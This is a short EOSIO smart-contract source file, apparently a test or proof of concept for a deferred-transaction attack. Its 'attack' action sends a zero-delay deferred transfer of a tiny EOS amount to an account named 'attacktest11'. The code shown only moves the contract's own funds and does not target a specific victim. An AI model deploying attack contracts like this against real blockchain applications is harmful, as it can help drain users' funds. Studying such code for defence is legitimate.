#include <eosiolib/eosio.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/transaction.hpp>

using namespace eosio;
using namespace std;

class attack3 : public contract
{
  public:
    using contract::contract;

    [[eosio::action]] void attack()
    {
        asset amount = asset(2, S(4, EOS));
        string memo = "";

        transaction tx{};
        tx.actions.emplace_back(permission_level{ _self, N(active) },
           N(eosio.token),
           N(transfer),
           make_tuple(_self, N(attacktest11), amount, memo));
        tx.delay_sec = 0;
        tx.send(now(), _self);
    }
};

EOSIO_ABI(attack3, (attack))
